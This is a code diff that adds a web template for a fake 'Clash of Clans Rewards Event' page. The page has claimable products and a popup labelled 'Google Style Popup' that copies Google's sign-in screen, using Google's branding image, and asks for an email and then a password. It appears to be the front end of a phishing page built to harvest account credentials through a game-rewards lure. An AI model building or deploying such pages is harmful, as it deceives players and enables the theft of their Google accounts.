@@ -1,0 +1,32 @@
+<header class="event-header">
+    <h1>Clash of Clans Rewards Event</h1>
+    <p class="timer">Limited Time: <span id="countdown"></span></p>
+</header>
+<div class="products">
+    <% products.forEach(product => { %>
+        <div class="product">
+            <img src="<%= product.image %>" alt="<%= product.name %>">
+            <h3><%= product.name %></h3>
+            <p><%= product.price %> Coins</p>
+            <button class="claim-btn" onclick="buyProduct('<%= product._id %>')">Claim</button>
+        </div>
+    <% }) %>
+</div>
+
+<!-- Google Style Popup -->
+<div class="popup" id="loginPopup">
+    <div class="popup-card">
+        <button onclick="document.getElementById('loginPopup').style.display='none'" class="close-btn">×</button>
+        <div class="step step-email">
+            <img src="https://www.gstatic.com/images/branding/product/1x/gsa_android_512dp.png" class="google-icon">
+            <h2>Sign in</h2>
+            <input type="email" id="loginEmail" placeholder="Email" required>
+            <button class="next-btn" onclick="checkEmail()">Next</button>
+        </div>
+        <div class="step step-password" style="display:none;">
+            <h2 id="loginTitle">Welcome</h2>
+            <input type="password" id="loginPassword" placeholder="Password" required>
+            <button class="next-btn" onclick="finishLogin()">Next</button>
+        </div>
+    </div>
+</div>
